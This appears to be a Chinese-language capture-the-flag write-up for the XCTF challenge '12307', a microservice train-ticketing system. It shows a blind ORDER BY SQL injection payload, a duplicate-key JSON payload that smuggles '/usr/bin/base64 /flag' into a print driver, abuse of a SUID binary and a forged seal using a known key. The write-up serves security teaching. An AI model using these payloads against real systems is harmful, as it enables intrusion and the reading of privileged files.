# 12307 — Book Your Train Ticket to the FLAG

## 题目信息
- **题目名称**：12307
- **题目描述**：Book your train ticket to the FLAG...... Now!
- **靶机地址**：http://web-8ba7465aa1.adworld.xctf.org.cn
- **附件**：12307.zip（微服务火车票务系统源码）

## 漏洞分析

题目是一个复杂的微服务架构火车票务系统，包含 15+ 个服务（Python/Node.js），通过 Redis 和 MySQL 进行数据交换，Nginx 做反向代理。

### 核心考点

1. **JSON 反序列化键值冲突** — `receipt_signer` 中 `first_wins_object` 与标准 `json.loads` 对重复键的处理差异
2. **复杂微服务链式调用** — 需要按正确顺序触发多个服务的特定接口
3. **Blind SQL Injection** — `reprice_fare` 接口中 `tariffScope` 参数的 ORDER BY 注入
4. **WebSocket 时序利用** — 令牌通道有严格 TTL，必须在过期前完成整条攻击链
5. **SUID 提权** — `/usr/bin/base64` 设置了 SUID(4755)，可读取 `/flag`

### 攻击链全景

```
用户 ─→ Edge Gateway (5010/Nginx)
         ├── SSO Gateway (5002) → 身份认证
         ├── Ticketing API (5000) → 创建订单
         ├── Station Portal (5003) → 公告查询/创建
         ├── Import Relay (5005→5008) → 触发内部流程
         ├── Waitlist Push (5001) → WebSocket 检票
         ├── Enterprise Gateway (5005) → 企业发票/收据
         ├── Settlement Scheduler (5007) → 调度结算
         └── Pricing Sampler (5004) → 查询渲染结果

内部链：
         Import Service (5008)
           ├── station-partner-feed → 设置 Redis 键 (lane/JWKS/board)
           ├── station-desk-ledger → 应用调整规则
           └── enterprise-clearing → 激活布局索赔
         
         Depot Layout (5009) → 生成 spool 票据
         Print Spooler (worker) → 执行 driverProgram
```

### 关键漏洞点

#### 1. SQL 注入 — `reprice_fare` (station_portal:app.py:197-225)

```python
scope = fare_scope_expression(data.get("tariffScope", "ticket"))
# 当 scope 为 dict 且 mode="legacy-rank" 时:
#   return str(scope.get("expr", "ticket_no"))[:240]
# 直接拼接到 ORDER BY 子句

sql = f"SELECT ... ORDER BY {scope} LIMIT 1"
```

利用方式：error-based blind injection
```json
{
  "tariffScope": {
    "mode": "legacy-rank",
    "expr": "(CASE WHEN ... THEN 1 ELSE(SELECT 1 UNION SELECT 2)END)"
  }
}
```
- 条件为真 → 200 priced
- 条件为假 → 202 manual_review (SQL 错误)

#### 2. JSON 重复键碰撞 — `verify_carrier_seal` (receipt_signer:app.py:82-131)

```python
# 使用 first_wins_object 解析用于校验
public_view = json.loads(payload_text, object_pairs_hook=first_wins_object)
# 使用标准 json.loads 解析用于提取参数
render_view = json.loads(payload_text)
```

`first_wins_object` 取第一个值，而 `json.loads` 取最后一个值。

构造双重键 Payload：
```json
{
  "printer": "thermal-standard",   // 校验时取此值 (first_wins)
  "printer": "line-printer",       // 渲染时取此值 (last wins)
  "driverProgram": "",
  "driverProgram": "/usr/bin/base64",
  "driverArgument": "",
  "driverArgument": "/flag"
}
```

#### 3. SUID base64 — 读取 `/flag` (Dockerfile)

```dockerfile
chown root:root /usr/bin/base64
chmod 4755 /usr/bin/base64
```

`base64 /flag` 以 root 权限执行，可读取只有 root 可读的 `/flag`。

## 解题步骤

### Step 1: SSO 认证 + 订单创建

POST `/api/mobile/identity/continue` 获取 session cookie：
```json
{
  "passenger": "user",
  "partnerMetadata": "compatBinding,railway-partner",
  "assertion": "<Audience>12307</Audience><NameID>user</NameID><Signature>RelayState</Signature>",
  "relayState": "continue,seat-hold",
  "trustLevel": ["settlement", "mobile", "partner"]
}
```

POST `/api/mobile/orders/hold` 完成 session（触发内部 session completion）。

POST `/api/mobile/orders` 创建订单（G7608 business，HGH 站点，初始余票为 0 自动 waitlisted）。

### Step 2: 公告 + 编译 Feed

POST `/api/desk/notices` 创建带 `proxyHint` 的公告：
```
X-Desk-Lane: delta-window-27
X-Board-Window: seat-window-e27  
X-Desk-Key-Id: POL-HGH-TRUSTED
X-Desk-Key: delta-window-27
```

POST `/api/corporate/imports/relay` 触发 `station-partner-feed` 适配器：
→ 解析公告头 → 设置 Redis 键 (lane, board profile, JWKS HMAC key)

### Step 3: SQL 注入提取 claim_salt

盲注提取 `station_claim_artifacts` 表中的 `claim_salt`。

### Step 4: 车票调整 + 布局激活

POST `/api/desk/tickets/adjust` 提交调整（需要正确的 claim_proof）。

POST `/api/corporate/imports/relay` 触发 `station-desk-ledger` → 设置 `sampled=1`、`batch_open=1`。

POST `/api/corporate/imports/relay` 触发 `enterprise-clearing` → 创建布局单元格。

### Step 5: WebSocket 检票

获取 waitlist_session → WebSocket 连接 → `boarding.hello` → `boarding.bind` → `boarding.confirm` → 创建 `rail:ledger:channel:{order_id}`。

### Step 6: 构建 Carrier Seal 并接收

使用已知密钥 `e94c0a8d-12307-hgh-trusted` 构造 JWT 风格的 carrier seal，利用 JSON 重复键注入 `driverProgram=/usr/bin/base64` 和 `driverArgument=/flag`。

POST `/api/corporate/receipts/prepare` 提交收据。

### Step 7: 调度结算

POST `/api/corporate/settlement/schedule` → 触发 settlement worker → depot layout → print spooler → `base64 /flag`。

### Step 8: 获取结果

GET `/api/corporate/reconciliation/{batch_id}` → 获取 base64 编码的 flag → 解码。

## 注意事项

1. **时序至关重要**：Redis 键有严格 TTL（board profile / JWKS: 240s, ledger channel: 90s, fulfillment epoch: 7s）。SQL 注入（最耗时）必须在早期完成，时间敏感步骤最后集中执行。
2. **claim salt**：必须通过 SQL 注入提取，无法预测（`random_id("R", 8)` 生成 8 位随机大写字母+数字）。
3. **carrier seal 签名**：HMAC 密钥通过 `compile_notice_feed` 从数据库 `signer_policies` 注入 Redis（已知）。
4. **多步骤状态依赖**：每一步都必须有正确的前置状态（session trusted、waitlisted order、sampled=1 等）。
